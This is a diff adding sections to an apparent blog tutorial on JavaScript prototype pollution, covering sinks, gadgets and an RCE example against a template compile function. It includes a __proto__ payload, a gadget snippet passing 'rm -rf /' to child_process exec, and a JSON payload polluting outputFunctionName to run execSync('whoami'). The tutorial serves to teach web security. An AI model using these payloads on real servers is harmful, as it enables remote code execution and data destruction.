@@ -10,7 +10,7 @@ Previously we went through how objects and prototype works in JavaScript and a h
 
 <figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption><p>A typical Prototype Pollution attack type Credits: PortSwigger</p></figcaption></figure>
 
-In order for prototype pollution vulnerability to work, the merge operation must be recursive, this operation will allow the user controlled properties to be assigned to the object's **prototype** instead of the object itself.&#x20;
+In order for prototype pollution vulnerability to work, the user controlled properties **must** be assigned to the object's **prototype** instead of the object itself. Hence polluting the prototype of the object. This can be done through functions like a recursive merge function.&#x20;
 
 As I mentioned in Part 1, to successfully exploit prototype pollution, you need the following key components
 
@@ -78,7 +78,101 @@ Using `JSON.parse()` method, if we convert the JSON object into a JavaScript obj
 
 ## Prototype pollution sinks
 
+A sink refers to a point in the code where untrusted input is processed or executed. This makes it a potential risk if it is not properly handled. In our case for a web application, it will usually be a JavaScript function or DOM element that allows for arbitrary JavaScript or system commands. This obviously depends on the type of web application and the dependency libraries that are in use.&#x20;
 
+```javascript
+function deepMerge(target, source) {
+    for (let key in source) {
+        if (typeof source[key] === 'object' && source[key] !== null) {
+            if (!target[key]) target[key] = {};
+            deepMerge(target[key], source[key]);
+        } else {
+            target[key] = source[key];  // 🚨 Prototype Pollution Sink
+        }
+    }
+}
+
+let maliciousPayload = JSON.parse('{ "__proto__": { "isAdmin": true } }');
+
+deepMerge({}, maliciousPayload);
+
+console.log({}.isAdmin); // ✅ True - Exploited!
+```
 
 ## Prototype pollution gadgets
 
+This is probably the most important part of prototype pollution as a gadget allows the vulnerability to become a viable exploit. Gadgets are usually existing function or a feature in the application that can be manipulated to trigger arbitrary execution or escalate privileges after polluting the prototype.
+
+{% code title="A example of exec method being use as a gadget for prototype pollution" %}
+```javascript
+const { exec } = require("child_process");
+
+let userInput = JSON.parse('{ "__proto__": { "shell": "rm -rf /" } }');
+
+// Polluting the prototype
+Object.assign({}, userInput);
+
+exec(userInput.shell, (error, stdout, stderr) => {
+    console.log(stdout);
+});
+
+```
+{% endcode %}
+
+A property can be used as a gadget if it is:
+
+* Used by the application in an unsafe way such as passing it to a sink without proper filtering.
+* The object must inherit a malicious version of the property added to the prototype by the attacker.
+
+## A example of prototype pollution
+
+Now for an specific example, I have a vulnerable function called `compile` and I control the `outputFunctionName` property of it.
+
+{% code title="An example of compile function Credits: Offsec" %}
+```javascript
+569    compile: function () {
+...
+574      var opts = this.opts;
+...
+584      if (!this.source) {
+585        this.generateSource();
+586        prepended +=
+587          '  var __output = "";\n' +
+588          '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
+589        if (opts.outputFunctionName) {
+590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
+591        }
+...
+609      }
+```
+{% endcode %}
+
+Based on line 590, to make the payload work, we need to do the following:
+
+```javascript
+ var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;'
+```
+
+We just need to add a `x=1; + our code; + y` to the payload to execute this part properly.
+
+If we were to have a JSON input for a API call on a `/sample` endpoint, we can do the following to ensure that our code executes:
+
+<pre class="language-json" data-title="A sample JSON input payload"><code class="lang-json"><strong>}
+</strong><strong>    "sampleProperty": "",
+</strong><strong>    "__proto__":
+</strong>    {
+        "outputFunctionName":   "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y"
+    }
+}
+</code></pre>
+
+This web application will process our payload to execute the system `whoami` command on the server hence allowing us to get RCE via prototype pollution.&#x20;
+
+**Author**
+
+* Frost :snowflake:
+
+**References**
+
+* [https://portswigger.net/web-security/prototype-pollution](https://portswigger.net/web-security/prototype-pollution)
+* Offsec Advanced Web Attack and Exploitation
